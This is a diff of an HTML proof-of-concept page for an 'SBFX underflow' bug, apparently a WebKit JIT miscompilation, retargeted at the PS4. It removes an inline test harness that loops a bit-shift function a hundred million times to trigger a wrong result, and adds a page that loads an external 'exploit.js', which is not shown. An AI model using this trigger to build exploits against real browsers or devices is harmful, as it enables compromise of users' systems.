@@ -1,56 +1,13 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>WebKit SBFX Underflow PoC</title>
+    <title>PS4 SBFX Underflow PoC</title>
 </head>
 <body>
-  <pre id="log"></pre>
-  <script>
-    function log(msg) {
-      document.getElementById("log").textContent += msg + "\n";
-    }
-
-    function foo(a, b, c) {
-      let x = a | 0;
-      let y = b | 0;
-      let z = c & 15;
-      z = (x << y) ^ (x << (y & 0x10ff));
-      let r = z ^ 0xf01;
-      let s = z ^ 0xf1f;
-
-      let result = (((a >>> r) << s) >> s);
-
-      return result;
-    }
-
-    function runTest() {
-      const LEN = 100_000_000 - 1;
-      let res = foo((LEN & 127), 456, 789);
-      log(`Initial test result: ${res}`);
-      if (res !== -1) {
-        log("❌ Initial test failed: " + res);
-        throw new Error("Wrong result in initial test: " + res);
-      }
-
-      for (let i = 0; i <= LEN; i++) {
-        res = foo((i & 127), 456, 789);
-        if (res !== -1) {
-          log("❌ Error at i = " + i + " result = " + res);
-          throw new Error("Loop test failed at i=" + i + ": " + res);
-        }
-        if (i % 10_000_000 === 0) {
-          log("Progress: i = " + i);
-        }
-      }
-
-      log("✅ All tests passed successfully");
-    }
-
-    window.onload = () => {
-      log("[+] Starting SBFX underflow PoC...");
-      setTimeout(runTest, 100);
-    };
-  </script>
+    <h1>PS4 SBFX/SBFM PoC with Logging</h1>
+    <p>Output below:</p>
+    <div id="out" style="white-space:pre; font-family:monospace;"></div>
+    <script src="exploit.js"></script>
 </body>
 </html>
